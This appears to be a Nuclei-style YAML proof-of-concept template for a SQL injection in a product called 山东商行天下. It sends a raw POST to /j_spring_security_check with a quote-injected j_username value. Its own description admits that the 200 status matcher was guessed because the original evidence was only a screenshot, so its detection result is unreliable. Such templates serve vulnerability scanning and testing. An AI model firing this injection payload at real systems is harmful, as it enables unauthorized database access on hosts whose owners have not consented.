id: poc-woeelfubzbeeo029
info:
  name: 山东商行天下j_spring_security Sql注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /j_spring_security_check HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    j_username=admin''&j_dept=default'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
